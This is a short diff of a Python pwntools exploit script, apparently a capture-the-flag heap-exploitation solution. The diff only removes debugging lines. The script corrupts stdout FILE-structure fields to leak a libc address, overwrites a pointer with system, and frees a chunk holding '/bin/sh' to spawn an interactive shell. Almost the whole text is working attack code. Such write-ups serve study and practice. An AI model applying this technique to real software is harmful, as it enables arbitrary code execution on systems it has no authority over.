@@ -44,7 +44,6 @@ edit( 1, 0x18, 'B' * 8 )
 add( 2, '/bin/sh\x00' )
 edit( 2, 0x18, 'C' * 8 )
 
-
 delete(0)
 delete(1)
 show()
@@ -57,6 +56,7 @@ flags = 0xfbad0800
 read_end = write_base = heapbase + 0x2a0 + 0x30 + 0x68
 write_ptr = heapbase + 0x2a0 + 0x30 + 0x68 + 0x6
 buf_base = heapbase + 0x2a0 + 0x30 + 0x1e0 + 0x30 + 0x1e0
+# buf_base = 0
 write_end = 0
 fileno = 1
 payload = flat(
@@ -71,8 +71,6 @@ payload = flat(
 )
 
 edit( 2, 0x1d8, payload )
-# gdb.attach(p)
-# input('>>>')
 edit( 1, 0x10, 'B' )
 libc = u64( p.recv(6).ljust( 8, b'\x00' ) ) - 0x1ed5c0
 info( f"libc: {hex(libc)}" )
@@ -100,13 +98,13 @@ payload = flat(
     fileno
 )
 
-# input('>>>')
 edit( 2, 0x1d8, payload )
 show()
+
 sleep(1)
 payload = p64( system ).ljust( 0x1ff, b'A' )
-# payload = p64( system )
 p.sendlineafter( '[0] \ndata: ', payload )
+
 delete(2)
 p.interactive()
 
